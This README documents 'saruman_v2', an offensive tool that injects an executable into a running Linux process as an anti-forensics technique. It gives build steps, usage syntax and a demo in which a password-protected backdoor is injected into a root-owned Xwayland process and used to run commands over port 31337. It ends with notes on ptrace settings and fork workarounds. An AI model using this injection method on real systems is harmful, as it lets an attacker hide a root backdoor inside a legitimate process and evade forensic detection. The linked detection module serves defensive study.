# saruman_v2

## Description

Saruman injects a dynamically linked PIE executable into a remote process image and creates
a thread of execution for it. This is an anti-forensics technique. Further improvements can be made
such as writing a custom loader to replace dlopen that specifically uses anonymous memory mappings.

## Build instructions

### Install libelfmaster

```
$ git clone git@github.com:elfmaster/libelfmaster
$ cd libelfmaster/src
$ make
$ sudo make install
```

### Build Saruman

```
$ cd saruman
$ make
```

### Usage

Specify the target pid of the process you want to inject into
Specify the path of the executable you want to run inside of the remote process
Specify the command line args of the program you are injecting
```
./saruman <target_pid> <exec_path> [args]
```
### Example of injecting ./backdoor into my Ubuntu 24 X11 server 'Xwayland'

#### Find the PID

elfmaster@arcana:~/git/saruman$ ps auxw | grep Xwayland
elfmast+    4925  0.0  0.0 683440 114048 ?       Sl   11:57   0:00 /usr/bin/Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.Y2EEW3 -listenfd 4 -list

#### Inject the ELF binary ./backdoor into the process

elfmaster@arcana:~/git/saruman$ sudo ./saruman 4925 $PWD/backdoor
Successfully injected executable /home/elfmaster/git/saruman/backdoor into target process 4925

#### Verify that the backdoor is now listening on port 31337

Let's telnet to localhost 31337 and see if our backdoor can run some
commands. It is running with the privileges of root within the Xwayland
driver program.

elfmaster@arcana:~/git/saruman$ telnet localhost 31337
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: password
Access Granted, HEH

Welcome To Gummo Backdoor Server!

Type 'HELP' for a list of commands

command:~# ls /tmp
snap-private-tmp
systemd-private-a975621c9fed44199f2f559c6cb46c2d-bluetooth.service-IxDdF0
systemd-private-a975621c9fed44199f2f559c6cb46c2d-bolt.service-xd3zlQ
systemd-private-a975621c9fed44199f2f559c6cb46c2d-colord.service-zFiOQv
systemd-private-a975621c9fed44199f2f559c6cb46c2d-fwupd.service-udAkDC
systemd-private-a975621c9fed44199f2f559c6cb46c2d-ModemManager.service-Lg0qZj
systemd-private-a975621c9fed44199f2f559c6cb46c2d-polkit.service-WXXF3y
systemd-private-a975621c9fed44199f2f559c6cb46c2d-power-profiles-daemon.service-8Kbwga
systemd-private-a975621c9fed44199f2f559c6cb46c2d-switcheroo-control.service-VLB0qJ
systemd-private-a975621c9fed44199f2f559c6cb46c2d-systemd-logind.service-xLSvmc
systemd-private-a975621c9fed44199f2f559c6cb46c2d-systemd-oomd.service-TpndI2
systemd-private-a975621c9fed44199f2f559c6cb46c2d-systemd-resolved.service-9OBAVy
systemd-private-a975621c9fed44199f2f559c6cb46c2d-systemd-timesyncd.service-RHYlvv
systemd-private-a975621c9fed44199f2f559c6cb46c2d-upower.service-NiazWl
command:~# 

### Detecting Saruman

I wrote a Shiva module that detects and prevents Saruman style thread injection.

https://github.com/advanced-microcode-patching/shiva/blob/x86_64_port/modules/x86_64_modules/detect_saruman/detect_saruman.c


### NOTES


1. The executable file that you are injecting will be slightly modified by
saruman. In order for the newer glibc's dlopen() to load a PIE executable
it must have the PIE flag turned off in the DT_FLAGS_1 tag of the dynamic
segment.  This won't effect the execution of the program in anyway but you
must have write access to the executable you are loading.

2. ptrace scope must be disabled (Set to 0) unless you call ./saruman as root.

3. Injecting parasite programs that use fork() will likely fail unless
they use SYS_clone() to avoid libc's fork(). You will notice backdoor.c
uses a custom fork() otherwise it would hang -- Our create_thread()
implementation doesn't setup TLS or it's own TCB, so when libc fork is
called it causes libc malloc() and other functions to freeze on the
first call.


